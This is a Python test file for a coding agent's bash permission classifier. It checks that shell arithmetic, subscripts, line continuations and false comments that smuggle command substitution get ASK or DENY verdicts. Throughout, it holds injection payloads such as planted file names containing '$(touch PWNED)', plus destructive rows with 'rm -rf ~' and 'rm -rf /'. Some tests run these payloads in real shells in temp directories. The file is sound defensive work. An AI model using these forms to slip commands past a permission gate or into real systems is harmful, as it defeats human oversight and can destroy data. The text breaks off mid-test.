"""#762 — arithmetic outside ``[`` / ``[[`` / ``test`` asks before it reads a name the shell fills itself, or quoted text.

On 71f837eb ``ls files/* >/dev/null; echo $((_))`` was ALLOW. bash fills ``_``
with the previous command's last argument, so with a repository file named
``files/z[$(touch PWNED)]`` the glob puts that name there, and arithmetic
evaluates the value again, array subscript included: bash 3.2.57 and 5.2.37 ran
``touch``. ``BASH_REMATCH`` after ``=~`` did the same, and so did ``KSH_MATCH``
after ``[[ x = * ]]`` in mksh. ``echo $(( '$(touch PWNED)' ))`` ran in all nine
shells measured: tree-sitter holds that ``$(…)`` in a ``raw_string``, which
reads as literal, but the shells expand ``$((…))`` text as if double-quoted.
#743 closed both for the operands of ``[``, ``[[`` and ``test``; #657's
arithmetic rule ("a bare name is a read") still allowed them everywhere else.

Every shell row was measured with ``<shell> -c`` in a scratch directory holding
``files/z[$(touch PWNED)]`` (and ``files/r`` with ``a[$(touch PWNED)]`` in it):
macOS bash 3.2.57, zsh 5.9, dash and ksh93u+ 2012-08-01, and Linux (docker
``python:3.12-slim``) bash 5.2.37, zsh 5.9, dash 0.5.12, ksh 93u+m/1.0.10 and
mksh 59c (``.omc/probes/762/impl/``). The comment on a row names the shells
that ran ``touch``.

Verdicts are compared with ``==``, not ``is``: ``test_bash_classifier.py``
reloads the classifier module last, which rebinds ``Verdict``.
"""

from __future__ import annotations

import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest
from aelix_agent_core.harness.hooks import ToolCallHookEvent, ToolCallResult
from aelix_coding_agent.builtin import bash_classifier as bc
from aelix_coding_agent.builtin.bash_classifier import Verdict, classify
from aelix_coding_agent.builtin.permission import PermissionExtension, evaluate_tool_call
from aelix_coding_agent.builtin.permission_mode import PermissionMode, PermissionPosture
from aelix_coding_agent.builtin.shell_classifiers.dialect import Dialect
from aelix_coding_agent.tools import bash as bash_module
from aelix_coding_agent.tools.bash import ShellConfig

from tests.builtin.gate_tools import BUILTIN_CONTEXT

_BASH_DIALECTS = (Dialect.UNKNOWN, Dialect.POSIX)
_P = "'a[$(touch PWNED)]'"

# The issue's classifier table: each was ALLOW on 71f837eb.
_ISSUE_TABLE = (
    "ls files/*; echo $((_))",
    "ls files/* >/dev/null; echo $((_))",  # bash 3.2 and 5.2
    "ls files/*; echo $((1+_))",
    f"echo {_P}; echo $((_))",  # bash 3.2 and 5.2
    f"echo {_P}; (( _ ))",  # bash 3.2 and 5.2
    f"echo {_P}; echo ${{a[_]}}",  # bash 3.2 and 5.2
    f"echo {_P}; echo $[_]",  # bash 3.2 and 5.2
    f"[[ {_P} =~ .* ]] && echo $((BASH_REMATCH))",  # bash 3.2 and 5.2
    "echo $(( '$(touch PWNED)' ))",  # all nine shells
)

# The other places arithmetic or an index reads text: ALLOW on 71f837eb.
_SIBLINGS = (
    # substring offset and length: bash 3.2 and 5.2 (``${@:_}`` bash 5.2 only)
    "ls files/* >/dev/null; echo ${PATH:_}",
    "ls files/* >/dev/null; echo ${PATH:0:_}",
    'ls files/* >/dev/null; echo "${PATH: _}"',
    "ls files/* >/dev/null; echo ${@:_}",
    f"[[ {_P} =~ .* ]] && echo ${{PATH:BASH_REMATCH}}",
    # a subscript in and out of arithmetic: bash 3.2 and 5.2 (``${#a[_]}`` none)
    "ls files/* >/dev/null; echo ${a[_]:-x}",
    "ls files/* >/dev/null; echo ${#a[_]}",
    "ls files/* >/dev/null; echo $(( a[_] ))",
    f"[[ {_P} =~ .* ]] && echo ${{a[BASH_REMATCH]}}",
    f"[[ {_P} =~ .* ]] && echo $((BASH_REMATCH[0]))",
    # ``$((…))`` in a string, a brace range, a here-string, ``[ … ]`` and
    # ``[[ … ]]`` outside an arithmetic operator, a substitution: bash 3.2, 5.2
    'ls files/* >/dev/null; echo "$((_))"',
    "ls files/* >/dev/null; echo {1..$((_))}",
    "ls files/* >/dev/null; cat <<< $((_))",
    "ls files/* >/dev/null; [[ -n $((_)) ]]",
    'ls files/* >/dev/null; [ -n "$((_))" ]',
    "ls files/* >/dev/null; echo $(echo $((_)))",
    "ls files/* >/dev/null; echo `echo $((_))`",
    "ls files/* >/dev/null; echo $((1,_)) $((1?_:2)) $((-_))",
    # ``_`` after other allowed reads: bash 3.2 and 5.2
    "cat files/* >/dev/null 2>&1; echo $((_))",
    "grep -l x files/* >/dev/null 2>&1; echo $((_))",
    "wc -c files/* >/dev/null; (( _ ))",
    # mksh 59c fills KSH_MATCH from ``[[ x = pattern ]]``
    f"[[ {_P} = * ]] && echo $((KSH_MATCH))",
    f"[[ {_P} = * ]] && echo ${{a[KSH_MATCH]}}",
    f"[[ {_P} = * ]] && (( KSH_MATCH ))",
    # a quote in the text: all nine shells, except as noted
    "echo $(( '`touch PWNED`' ))",
    "echo $(( 'a[$(touch PWNED)]' ))",
    "echo \"$(( '$(touch PWNED)' ))\"",
    "[[ -n $(( '$(touch PWNED)' )) ]]",
    "test -n \"$(( '$(touch PWNED)' ))\"",
    "[ -n \"$(( '$(touch PWNED)' ))\" ]",
    "(( '$(touch PWNED)' ))",  # bash 5.2, zsh, both ksh93 builds
    "(( '`touch PWNED`' ))",  # the same
    "echo $[ '$(touch PWNED)' ]",  # bash and zsh
    'echo $(( "a[\\$(touch PWNED)]" ))',  # macOS ksh93u+
    # no shell measured ran these; they ask by the same rules
    "echo $((BASH_EXECUTION_STRING))",
    "ls files/* >/dev/null; [[ -t _ ]]",
    "ls files/* >/dev/null; test -t _",
    "ls files/* >/dev/null; echo $a[_]",
    "ls files/* >/dev/null; echo ${PATH}[_]",
    "echo $(( '1' + 2 ))",
    'echo $(( "1" + 2 ))',
    "echo $((1 \\\n+ 2))",
)


@pytest.mark.parametrize("dialect", _BASH_DIALECTS)
@pytest.mark.parametrize("command", _ISSUE_TABLE + _SIBLINGS)
def test_arithmetic_reading_a_shell_filled_name_or_quoted_text_asks(
    command: str, dialect: Dialect
) -> None:
    assert classify(command, dialect=dialect) == Verdict.ASK, command


# The entry-point sweep's other places: they asked on 71f837eb for a reason of
# their own, and still do.
_ALREADY_ASK = (
    # tree-sitter reads ``$((`` in a here-document body as ``$(`` + a subshell
    "ls files/* >/dev/null; cat <<EOF\n$((_))\nEOF",
    "ls files/* >/dev/null; cat <<EOF\n$[_]\nEOF",
    "cat <<EOF\n$(( '$(touch PWNED)' ))\nEOF",
    # control flow (``for ((…))``, ``case``, ``select``) and ``let``/``declare``
    "for (( i='$(touch PWNED)'; i<1; i++ )); do :; done",
    "ls files/* >/dev/null; case $((_)) in *) :;; esac",
    "select x in a; do echo $((REPLY)); break; done",
    f"echo {_P}; let _",
    "declare -i x=_",
    # #743's operand rule, a substitution in the operand, a quoted index
    "ls files/* >/dev/null; [[ $((_)) -eq 0 ]]",
    "echo ${x:-$(( '$(touch PWNED)' ))}",
    'echo $(( "$(touch PWNED)" ))',
    "echo ${a['$(touch PWNED)']}",
    "echo $(( a['$(touch PWNED)'] ))",
    # the commands that fill REPLY, OPTARG, MAPFILE, BASH_ALIASES, ``.sh.match``
    "read < files/r; echo $((REPLY))",
    f"getopts a: o -a {_P}; echo $((OPTARG))",
    "mapfile < files/r; echo $((MAPFILE))",
    f"alias x={_P}; echo $((BASH_ALIASES[x]))",
    f"[[ {_P} == @(*) ]] && echo ${{a[.sh.match]}}",  # macOS ksh93u+
    # macOS ksh93u+ evaluates printf's %d argument as arithmetic
    "printf '%d\\n' 'a[$(touch PWNED)]'",
)


@pytest.mark.parametrize("command", _ALREADY_ASK)
def test_the_other_entry_points_still_ask(command: str) -> None:
    assert classify(command) == Verdict.ASK, command


# ALLOW on 71f837eb and still ALLOW: an ordinary name is a read (ADR-0288), a
# name the shell sets only to a number stays one, and the zsh match names stay
# ordinary names (zsh ran no ``$(…)`` from a name's value in any form measured).
_STAYS_ALLOW = (
    "echo $((i+1))",
    "echo ${a[i]}",
    "echo $((x*2))",
    "echo $((RANDOM % 6))",
    "(( a > b )) && echo yes",
    "echo $[i+1]",
    "echo $((SECONDS / 60))",
    "echo $((LINENO)) $((PPID)) $((OPTIND - 1))",
    "(( BASH_VERSINFO[0] >= 4 )) && echo new",
    '[[ $v =~ ^v([0-9]+) ]] && echo "${BASH_REMATCH[1]}"',
    "echo ${PWD:0:1} ${#PWD}",
    'echo "${@:2}" ${str:i:1}',
    "echo $((x_1 + _y)) ${a[_x]} ${a[__]}",
    "echo '$(( _ ))'",
    'echo "\\$((_))"',
    "echo $(( $# + $? ))",
    "echo $(( 1 + 2 )) # don't",
    f"[[ {_P} =~ .* ]] && echo $((MATCH))",
    "echo $(( REPLY_COUNT )) $(( COMP ))",
)


@pytest.mark.parametrize("dialect", _BASH_DIALECTS)
@pytest.mark.parametrize("command", _STAYS_ALLOW)
def test_ordinary_arithmetic_stays_allow(command: str, dialect: Dialect) -> None:
    assert classify(command, dialect=dialect) == Verdict.ALLOW, command


# Fix round 1: a length (``${#name}``) and a base-N literal (``36#REPLY``) read
# no name's value. ALLOW on 71f837eb, ASK on 7cbc282d, ALLOW again; none of
# these ran anything in the nine shells with the name holding
# ``a[$(: > MARK)]``, while ``$((_))``, ``$((REPLY))``, ``$((BASH_REMATCH))``
# and ``$((KSH_MATCH))`` did (``.omc/probes/762/fix-r1/item2/``).
_LENGTH_AND_BASE_N = (
    "echo $(( ${#PWD} + 1 ))",
    "echo $(( ${#REPLY} ))",
    "echo $(( ${#_} ))",
    "ls files/* >/dev/null; echo $(( ${#_} + 1 ))",
    "ls files/* >/dev/null; (( ${#_} ))",
    "ls files/* >/dev/null; echo $[ ${#_} ]",
    "echo $(( ${#COMP_WORDS[@]} - 1 ))",
    "[[ $v =~ x ]] && echo $(( ${#BASH_REMATCH[@]} ))",
    "echo $(( ${#BASH_REMATCH[0]} ))",
    "echo $((36#REPLY))",
    "echo $((64#_))",
    "ls files/* >/dev/null; (( 64#_ ))",
)


@pytest.mark.parametrize("dialect", _BASH_DIALECTS)
@pytest.mark.parametrize("command", _LENGTH_AND_BASE_N)
def test_a_length_or_base_n_literal_stays_allow(command: str, dialect: Dialect) -> None:
    assert classify(command, dialect=dialect) == Verdict.ALLOW, command


# The name itself still asks beside a length or a base-N literal.
_NAME_BESIDE_A_LENGTH = (
    "echo $((PWD))",
    "echo $(( ${#PWD} + _ ))",
    "echo $(( ${#a[_]} ))",
    "echo $((36#REPLY + REPLY))",
)


@pytest.mark.parametrize("dialect", _BASH_DIALECTS)
@pytest.mark.parametrize("command", _NAME_BESIDE_A_LENGTH)
def test_the_name_beside_a_length_still_asks(command: str, dialect: Dialect) -> None:
    assert classify(command, dialect=dialect) == Verdict.ASK, command


@pytest.mark.parametrize(
    ("text", "filled"),
    [
        ("_", True),
        (" _ ", True),
        ("1+_", True),
        ("a[_]", True),
        ("BASH_REMATCH[0]", True),
        ("KSH_MATCH", True),
        ("REPLY", True),
        ("OPTARG", True),
        ("MAPFILE", True),
        ("BASH_ARGV", True),
        ("BASH_SOURCE", True),
        ("FUNCNAME", True),
        ("BASH_COMMAND", True),
        ("BASH_EXECUTION_STRING", True),
        ("BASH_ALIASES[x]", True),
        ("BASH_CMDS[x]", True),
        ("PWD", True),
        ("OLDPWD", True),
        ("DIRSTACK[0]", True),
        ("COMPREPLY", True),
        ("COMP_LINE", True),
        ("READLINE_LINE", True),
        # ksh93's namespace; tree-sitter rejects it in arithmetic and
        # ``_SAFE_INDEX`` in an index today, so the rule is a guard for both.
        (".sh.match", True),
        ("0+.sh.file", True),
        (".sh", True),
        ("$_", True),
        # ordinary names, numbers and the numeric ones the shell sets
        ("i", False),
        ("_x", False),
        ("x_", False),
        ("__", False),
        ("_1", False),
        ("REPLY_COUNT", False),
        ("MY_REPLY", False),
        ("COMP", False),
        ("x.sh", False),
        (".shell", False),
        ("a.shell", False),
        ("RANDOM", False),
        ("SECONDS", False),
        ("LINENO", False),
        ("PPID", False),
        ("OPTIND", False),
        ("BASH_VERSINFO[0]", False),
        ("MATCH", False),
        ("match", False),
        ("0x1F", False),
        ("16#ff", False),
        # fix round 1: a length and a base-N literal read no name's value
        ("${#PWD} + 1", False),
        ("${#_}", False),
        ("${#REPLY}", False),
        ("${#COMP_WORDS[@]} - 1", False),
        ("${#BASH_REMATCH[*]}", False),
        ("${#BASH_REMATCH[0]}", False),
        ("36#REPLY", False),
        ("64#_", False),
        ("2#1 + 64#_", False),
        # ... but the same name anywhere else still counts
        ("${#PWD} + _", True),
        ("${#a[_]}", True),
        ("${#_[_]}", True),
        ("36#REPLY + REPLY", True),
        ("x1#_", True),
        ("${#.sh.match}", True),
        # fix round 2: a ``#`` with no digits before it is no base, a base-N
        # word ends before ``[``, and a length taken out leaves two names
        ("#_", True),
        ("36#x[_]", True),
        ("RE${#x}PLY", False),
    ],
)
def test_which_text_reads_a_shell_filled_name(text: str, filled: bool) -> None:
    assert bc._names_shell_filled(text) is filled


# --- Real shells ---------------------------------------------------------------
#
# Each row runs the form itself in a scratch directory holding a file named
# ``files/z[$(touch PWNED)]`` and needs PWNED to appear: the form is
# dangerous. Then the classifier must ask, which it did not on 71f837eb.

_PATH_ENV = {"PATH": "/usr/bin:/bin", "LC_ALL": "C"}


def _shell_or_skip(name: str) -> str:
    if sys.platform == "win32":
        pytest.skip("POSIX shells and a file name holding $( and [")
    path = shutil.which(name)
    if path is None:
        pytest.skip(f"no {name}")
    return path


def _run_planted(shell: str, command: str, work: Path, env: dict[str, str] | None = None) -> bool:
    """Run ``command`` with ``files/z[$(touch PWNED)]`` planted; whether PWNED appeared."""

    (work / "files").mkdir(parents=True)
    (work / "files" / "z[$(touch PWNED)]").write_bytes(b"")
    subprocess.run(
        [shell, "-c", command],
        cwd=work,
        env={**_PATH_ENV, **(env or {})},
        stdin=subprocess.DEVNULL,
        capture_output=True,
        timeout=60,
        check=False,
    )
    return (work / "PWNED").exists()


# Ran ``touch`` in bash 3.2.57 and 5.2.37 alike.
_BASH_RUNS = (
    "ls files/* >/dev/null; echo $((_))",
    "ls files/* >/dev/null; echo $((1+_))",
    "ls files/* >/dev/null; (( _ ))",
    "ls files/* >/dev/null; echo ${a[_]}",
    "ls files/* >/dev/null; echo $[_]",
    "ls files/* >/dev/null; echo ${PATH:_}",
    'ls files/* >/dev/null; [ -n "$((_))" ]',
    "ls files/* >/dev/null; cat <<< $((_))",
    f"echo {_P}; echo $((_))",
    f"[[ {_P} =~ .* ]] && echo $((BASH_REMATCH))",
)


@pytest.mark.parametrize("command", _BASH_RUNS)
def test_bash_runs_the_name_form_and_it_asks(command: str, tmp_path: Path) -> None:
    bash = _shell_or_skip("bash")
    assert _run_planted(bash, command, tmp_path), f"bash did not run {command!r}"
    assert classify(command) == Verdict.ASK, command


# Ran ``touch`` in all nine shells measured.
_QUOTED_RUNS = (
    "echo $(( '$(touch PWNED)' ))",
    "echo $(( '`touch PWNED`' ))",
    "echo $(( 'a[$(touch PWNED)]' ))",
)


@pytest.mark.parametrize("shell", ["bash", "zsh", "dash", "ksh", "mksh"])
@pytest.mark.parametrize("command", _QUOTED_RUNS)
def test_every_shell_runs_the_quoted_form_and_it_asks(
    command: str, shell: str, tmp_path: Path
) -> None:
    path = _shell_or_skip(shell)
    assert _run_planted(path, command, tmp_path), f"{shell} did not run {command!r}"
    assert classify(command) == Verdict.ASK, command


def test_mksh_runs_ksh_match_and_it_asks(tmp_path: Path) -> None:
    mksh = _shell_or_skip("mksh")
    command = f"[[ {_P} = * ]] && echo $((KSH_MATCH))"
    assert _run_planted(mksh, command, tmp_path), "mksh did not run the KSH_MATCH form"
    assert classify(command) == Verdict.ASK


# The premise for leaving these names ALLOW: the shell sets them only to a
# number, so even text exported under the name runs nothing (none of the nine
# shells measured ran it). ``FOO`` is the positive control: exported, it runs,
# like any name the environment sets (ADR-0288 leaves those to the user).
@pytest.mark.parametrize("name", ["RANDOM", "SECONDS", "LINENO", "PPID", "OPTIND"])
def test_a_numeric_shell_name_holds_no_text_and_stays_allow(name: str, tmp_path: Path) -> None:
    bash = _shell_or_skip("bash")
    command = f"echo $(({name}))"
    planted = {name: "a[$(touch PWNED)]"}
    assert not _run_planted(bash, command, tmp_path / name, planted), name
    assert _run_planted(bash, "echo $((FOO))", tmp_path / "FOO", {"FOO": "a[$(touch PWNED)]"})
    assert classify(command) == Verdict.ALLOW, command


def _run_marked(shell: str, command: str, work: Path, env: dict[str, str] | None = None) -> bool:
    """Run ``command`` with ``files/z[$(: > MARK)]`` planted; whether MARK appeared."""

    (work / "files").mkdir(parents=True)
    (work / "files" / "z[$(: > MARK)]").write_bytes(b"")
    subprocess.run(
        [shell, "-c", command],
        cwd=work,
        env={**_PATH_ENV, **(env or {})},
        stdin=subprocess.DEVNULL,
        capture_output=True,
        timeout=60,
        check=False,
    )
    return (work / "MARK").exists()


# Fix round 1: a length or a base-N literal runs nothing where the name it
# holds does. bash fills ``_`` from the glob; the other names are exported.
_INERT = (
    ("ls files/* >/dev/null; echo $(( ${#_} ))", {}),
    ("ls files/* >/dev/null; echo $((64#_))", {}),
    ("echo $(( ${#REPLY} ))", {"REPLY": "a[$(: > MARK)]"}),
    ("echo $((36#REPLY))", {"REPLY": "a[$(: > MARK)]"}),
)


@pytest.mark.parametrize("shell", ["bash", "zsh", "dash", "ksh", "mksh"])
@pytest.mark.parametrize(("command", "env"), _INERT)
def test_a_length_or_base_n_literal_runs_nothing(
    command: str, env: dict[str, str], shell: str, tmp_path: Path
) -> None:
    path = _shell_or_skip(shell)
    assert not _run_marked(path, command, tmp_path / "form", env), f"{shell} ran {command!r}"
    if shell == "bash":
        control = command.replace("${#_}", "_").replace("64#_", "_")
        control = control.replace("${#REPLY}", "REPLY").replace("36#REPLY", "REPLY")
        assert _run_marked(path, control, tmp_path / "control", env), control
    assert classify(command) == Verdict.ALLOW, command


# --- Fix round 1: a backslash-newline that hides arithmetic ---------------------
#
# The shells remove ``\⏎`` before they read the words around it, and
# tree-sitter reads it as a blank: ``$(\⏎(`` is arithmetic to the shells and
# a command substitution holding a subshell to tree-sitter, so no arithmetic
# check saw it. Each row was ALLOW on 71f837eb and on 7cbc282d (#762 round 1);
# the comment names the shells that created MARK with ``files/z[$(: > MARK)]``
# planted, out of macOS bash 3.2.57, zsh 5.9, dash and ksh93u+ and Linux bash
# 5.2.37, zsh 5.9, dash 0.5.12, ksh 93u+m and mksh 59c
# (``.omc/probes/762/fix-r1/grid/``).
_BN = "\\\n"
_MARK_Q = "'$(: > MARK)'"
_JOINED_ASK = (
    # bash 3.2 and 5.2
    f"ls files/* >/dev/null; echo $({_BN}(echo -_))",
    f"ls files/* >/dev/null; echo $({_BN}{_BN}(echo -_))",
    f"ls files/* >/dev/null; echo ${_BN}[_]",
    f"ls files/* >/dev/null; echo ${_BN}{{a[_]}}",
    f"ls files/* >/dev/null; echo ${_BN}{{PATH:_}}",
    f"ls files/* >/dev/null; ({_BN}(echo -_))",
    f'ls files/* >/dev/null; echo "${_BN}((_))"',
    f"ls files/* >/dev/null; cat <<EOF\n${_BN}((_))\nEOF",
    f"ls files/* >/dev/null; cat <<< $({_BN}(echo -_))",
    f"ls files/* >/dev/null; echo `echo $({_BN}(echo -_))`",
    f"ls files/* >/dev/null # x {_BN}echo $({_BN}(echo -_))",
    # every shell but macOS ksh93u+, which reads a substitution there too
    f"echo $({_BN}(echo {_MARK_Q}))",
    f"echo $(echo $({_BN}(echo {_MARK_Q})))",
    f"echo hi # x {_BN}echo $({_BN}(echo {_MARK_Q}))",
    f"cat <<'EOF'\nx{_BN}EOF\necho $({_BN}(echo {_MARK_Q}))",
    f"echo 'a{_BN}b'; echo $({_BN}(echo {_MARK_Q}))",
    # bash, dash, Linux ksh 93u+m and mksh
    f"echo $({_BN}{_BN}(echo {_MARK_Q}))",
    # bash and zsh
    f"echo ${_BN}[{_MARK_Q}]",
    f"echo ${_BN}{{PATH:{_MARK_Q}}}",
    # Linux bash 5.2
    f"({_BN}(echo {_MARK_Q}))",
    # #657's assignment rule, hidden the same way
    f"echo $({_BN}(echo X=5))",
)


@pytest.mark.parametrize("dialect", _BASH_DIALECTS)
@pytest.mark.parametrize("command", _JOINED_ASK)
def test_arithmetic_split_by_a_line_continuation_asks(command: str, dialect: Dialect) -> None:
    assert classify(command, dialect=dialect) == Verdict.ASK, command


_JOINED_BASH_RUNS = (
    f"ls files/* >/dev/null; echo $({_BN}(echo -_))",
    f"ls files/* >/dev/null; echo ${_BN}[_]",
    f"ls files/* >/dev/null; echo ${_BN}{{a[_]}}",
    f"ls files/* >/dev/null; ({_BN}(echo -_))",
    f"ls files/* >/dev/null # x {_BN}echo $({_BN}(echo -_))",
)


@pytest.mark.parametrize("command", _JOINED_BASH_RUNS)
def test_bash_runs_the_split_name_form_and_it_asks(command: str, tmp_path: Path) -> None:
    bash = _shell_or_skip("bash")
    assert _run_marked(bash, command, tmp_path), f"bash did not run {command!r}"
    assert classify(command) == Verdict.ASK, command


# The second and third keep ``\⏎`` where the shells do (a comment, a quoted
# here-document body) and still run the line after it.
_JOINED_QUOTED_RUNS = (
    f"echo $({_BN}(echo {_MARK_Q}))",
    f"echo hi # x {_BN}echo $({_BN}(echo {_MARK_Q}))",
    f"cat <<'EOF'\nx{_BN}EOF\necho $({_BN}(echo {_MARK_Q}))",
)


@pytest.mark.parametrize("shell", ["bash", "zsh", "dash", "mksh"])
@pytest.mark.parametrize("command", _JOINED_QUOTED_RUNS)
def test_every_shell_runs_the_split_quoted_form_and_it_asks(
    command: str, shell: str, tmp_path: Path
) -> None:
    path = _shell_or_skip(shell)
    assert _run_marked(path, command, tmp_path), f"{shell} did not run {command!r}"
    assert classify(command) == Verdict.ASK, command


# Where every shell keeps ``\⏎`` (``'…'``, ``$'…'``, a quoted here-document
# body; ``.omc/probes/762/fix-r1/grid/keepbn-*.txt``) nothing is joined, and
# continued lines of ordinary commands read as the one line they are.
_JOINED_STAYS_ALLOW = (
    f"ls files/* >/dev/null; echo '$({_BN}(_))'",
    f"ls files/* >/dev/null; echo $'${_BN}[_]'",
    f"ls files/* >/dev/null; cat <<'EOF'\n$({_BN}(_))\nEOF",
    f"ls -la {_BN}  src/ {_BN}  tests/",
    f"git log --oneline {_BN}  --since=2024-01-01 {_BN}  -- src/",
    f"find . -name '*.py' {_BN}  -not -path './.venv/*' {_BN}  -type f",
    f"echo $((i + 1)) {_BN}  $((j * 2))",
    f"echo $(( ${{#arr[@]}} - 1 )) {_BN}  ${{PATH:0:4}}",
    f"cat <<EOF\nline one {_BN}continued\nEOF",
    f"echo 'a{_BN}b' \"c{_BN}d\"",
)


@pytest.mark.parametrize("dialect", _BASH_DIALECTS)
@pytest.mark.parametrize("command", _JOINED_STAYS_ALLOW)
def test_continued_lines_that_hide_nothing_stay_allow(command: str, dialect: Dialect) -> None:
    assert classify(command, dialect=dialect) == Verdict.ALLOW, command


# The higher of the two readings: a joined line that is DENY makes it DENY
# (each was ASK on 7cbc282d, through ``_has_continuation_join``).
@pytest.mark.parametrize("command", [f"r{_BN}m -rf /", f"find . -de{_BN}lete"])
def test_a_joined_line_keeps_its_deny(command: str) -> None:
    assert classify(command) == Verdict.DENY, command


@pytest.mark.parametrize(
    ("source", "joined"),
    [
        (b"a\\\nb", b"ab"),
        (b"a\\\\\nb", b"a\\\\\nb"),  # an even run quotes itself; the newline stays
        (b"a\\\\\\\nb", b"a\\\\b"),
        (b'echo "a\\\nb"', b'echo "ab"'),
        (b"echo `echo a\\\nb`", b"echo `echo ab`"),
        (b"cat <<E\nx\\\ny\nE", b"cat <<E\nxy\nE"),
        (b"echo 'a\\\nb'", b"echo 'a\\\nb'"),
        (b"echo $'a\\\nb'", b"echo $'a\\\nb'"),
        (b"echo hi # x \\\nls", b"echo hi # x \\\nls"),
        (b"cat <<'E'\nx\\\nE", b"cat <<'E'\nx\\\nE"),
        (b'cat <<"E\\\\"\nx\nE\\\nls', b'cat <<"E\\\\"\nx\nE\\\nls'),
        (b"echo 'a\\\nb' c\\\nd", b"echo 'a\\\nb' cd"),
    ],
)
def test_which_continuations_are_joined(source: bytes, joined: bytes) -> None:
    assert bc._PARSER is not None
    root = bc._PARSER.parse(source).root_node
    assert bc._joined_lines(root, source) == joined


# A quoted here-document ends on its raw end line, ``\⏎`` and all: every
# shell ran ``: > MARK`` after ``E\`` for ``<<"E\\"``, ``<<'E\'`` and ``<<E\\``
# (``.omc/probes/762/fix-r1/grid/heredoc-end-*.jsonl``), so
# that line is not joined, and the ``find`` stays in the second body.
@pytest.mark.parametrize("shell", ["bash", "zsh", "dash", "ksh", "mksh"])
def test_a_quoted_heredoc_ends_on_its_raw_end_line(shell: str, tmp_path: Path) -> None:
    path = _shell_or_skip(shell)
    assert _run_marked(path, f'cat <<"E\\\\"\nx\nE{_BN}: > MARK\n', tmp_path), shell
    command = f"cat <<\"E\\\\\"\nx\nE{_BN}cat <<'Q'\nE\\ \nfind victim -delete\nQ"
    assert classify(command) == Verdict.ASK, command  # 7cbc282d: ASK; DENY when joined


def test_an_unpaid_joined_reread_asks(monkeypatch: pytest.MonkeyPatch) -> None:
    command = f"ls -la {_BN}  src/"
    assert classify(command) == Verdict.ALLOW
    monkeypatch.setattr(bc, "_REREAD_PASSES", 0)
    monkeypatch.setattr(bc, "_REREAD_SLACK", 0)
    assert classify(command) == Verdict.ASK


def test_a_joined_reread_out_of_stack_never_lowers(monkeypatch: pytest.MonkeyPatch) -> None:
    def out_of_stack(text: bytes, *, dialect: Dialect) -> Verdict:
        raise RecursionError

    monkeypatch.setattr(bc, "_reread_joined", out_of_stack)
    assert classify(f"rm -rf / {_BN}  -v") == Verdict.DENY
    assert classify(f"ls -la {_BN}  src/") == Verdict.ASK


def test_a_joined_text_the_parser_rejects_asks_or_keeps_its_deny() -> None:
    assert bc._reread_joined(b"ls\necho $(", dialect=Dialect.UNKNOWN) == Verdict.ASK
    assert bc._reread_joined(b"rm -rf /\necho $(", dialect=Dialect.UNKNOWN) == Verdict.DENY


def test_a_command_with_no_continuation_is_not_joined(monkeypatch: pytest.MonkeyPatch) -> None:
    def never(root: Any, source: bytes) -> bytes:
        raise AssertionError(source)

    monkeypatch.setattr(bc, "_joined_lines", never)
    assert classify("ls -la src/") == Verdict.ALLOW


# --- Fix round 2: a quote that does not quote, and a comment that is not one ---
#
# Each ASK and DENY row was ALLOW on 71f837eb and on eb98b93b (#762 fix round
# 1, folded). The comment on a row names the shells that created MARK with
# ``files/z[$(: > MARK)]`` planted, out of the nine above
# (``.omc/probes/762/fix-r2/shells/``). DENY rows were only classified.
#
# A ``'…'`` in a ``${…}`` operand inside a here-document body or a
# double-quoted string is literal to the shells, which remove a ``\⏎`` in it:
# ``printf "[%s]\n" "${x:-'a\⏎b'}"`` printed ``['ab']`` in all but Linux
# ksh 93u+m.
_R2_QUOTE_ASK = (
    # all nine
    "cat <<E\n${x:-'$" + _BN + "(: > MARK)'}\nE",
    # bash 3.2 and 5.2
    "ls files/* >/dev/null; cat <<E\n${x:-'$" + _BN + "{a[_]}'}\nE",
    "ls files/* >/dev/null; cat <<E\n${x:-'$" + _BN + "[_]'}\nE",
    # macOS dash and ksh93u+, Linux dash and mksh
    "echo \"${x:-'$" + _BN + "(: > MARK)'}\"",
    "echo \"${x-'$" + _BN + "(: > MARK)'}\"",
    "echo \"${x:?'$" + _BN + "(: > MARK)'}\"",
    "echo \"${x:-'$" + _BN + _BN + "(: > MARK)'}\"",
)
_R2_QUOTE_DENY = (
    "cat <<E\n${x:-'$" + _BN + "(rm -rf ~)'}\nE",
    "echo \"${x:-'$" + _BN + "(rm -rf ~)'}\"",
)
# tree-sitter-bash 0.25.1 starts a comment after an escaped blank, a
# vertical tab, a form feed and ``]]``; the shells read the ``#`` and all
# after it as part of a word.
_R2_COMMENT_ASK = (
    # all nine
    "echo \\ #$(: > MARK)",
    "cat \\ #$(: > MARK)",
    "ls \\ #$(: > MARK)",
    "echo \\\t#$(: > MARK)",
    "echo \\ \\ #$(: > MARK)",
    "echo a \\ #$(: > MARK)",
    "echo \\ #a \\ #$(: > MARK)",
    "echo " + _BN + "\\ #$(: > MARK)",
    "echo \x0b#$(: > MARK)",
    "echo \x0c#$(: > MARK)",
    "echo \\\x0b#$(: > MARK)",
    "echo \\ #a\necho \\ #$(: > MARK)",
    "\x0b#$(: > MARK)",
    "\\ #$(: > MARK)",
    # bash 3.2 and 5.2
    "ls files/* >/dev/null; echo \\ #$((_))",
    "ls files/* >/dev/null; cat <<E \\ #$(" + _BN + "(echo -_))\nE",
    # dash, which has no ``[[``
    "[[ a ]]#$(: > MARK)",
)
_R2_COMMENT_DENY = (
    "echo \\ #$(rm -rf ~)",
    "echo \\ #a \\ #$(rm -rf ~)",
    "echo \x0b#$(rm -rf ~)",
    "echo \\ #a\necho \\ #$(rm -rf ~)",
    "\\ #$(rm -rf ~)",
)
# The shells start these comments, and ran no ``$(: > MARK)`` in them.
_R2_COMMENT_ALLOW = (
    "echo hi # $(: > MARK)",
    "echo hi\t#$(: > MARK)",
    "echo '' #$(: > MARK)",
    "echo $'' #$(: > MARK)",
    "echo \\\\ #$(: > MARK)",
    "echo \\  #$(: > MARK)",
    "echo " + _BN + "#$(: > MARK)",
    "(echo)#$(: > MARK)",
    "echo;#$(: > MARK)",
    "{ #$(: > MARK)\n}",
    "#!/bin/sh\necho hi #$(: > MARK)",
    "ls -la  # list files",
    "git status  # what changed",
    "grep -rn TODO src/  # open items",
)
# Linux ksh 93u+m keeps the ``\⏎`` in the second, the other eight remove
# it; neither ran anything in the nine shells.
_R2_STAYS_ALLOW = (
    "echo ${x:-'$" + _BN + "(: > MARK)'}",
    "echo \"${x:-'a" + _BN + "b'}\"",
)


@pytest.mark.parametrize("dialect", _BASH_DIALECTS)
@pytest.mark.parametrize(
    ("command", "verdict"),
